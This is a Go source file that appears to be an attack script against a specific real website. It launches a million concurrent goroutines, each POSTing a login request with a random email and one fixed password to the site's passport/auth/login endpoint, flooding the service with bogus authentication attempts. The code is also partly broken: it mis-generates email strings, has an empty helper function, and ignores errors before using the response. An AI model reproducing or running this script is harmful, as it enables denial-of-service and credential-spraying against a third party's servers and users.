package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func randomEmail() {
	for i := 0; i < 5; i++ {
		fmt.Println()
	}
}

func main() {
	ch2 := make(chan interface{})
	for i := 0; i < 1000000; i++ {

		go httpPostForm(string(rand.Int())+"@gmail.com", ch2)
	}
	i := 0
	for {
		select {
		case u := <-ch2:
			print(u)
			i = 0
		default:
			print("ok")
			if i > 10 {
				goto Loop
			}
			i++
			time.Sleep(time.Second)
		}
	}
Loop:
	print("执行完成")
}
func zhToUnicode(raw []byte) ([]byte, error) {
	str, err := strconv.Unquote(strings.Replace(strconv.Quote(string(raw)), `\\u`, `\u`, -1))
	if err != nil {
		return nil, err
	}
	return []byte(str), nil
}
func httpPostForm(email string, chanel chan interface{}) {
	chanel <- email
	resp, err := http.PostForm("https://fq.rs/api/v1/passport/auth/login",
		url.Values{"key": {"value"}, "email": {email}, "password": {"fkairport1314"}})
	if err != nil {
		// handle error
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// handle error
	}
	textQuoted := string(body)
	textUnquoted := textQuoted[1 : len(textQuoted)-1]
	v, _ := zhToUnicode([]byte(textUnquoted))
	print(v)

	chanel <- textQuoted

}
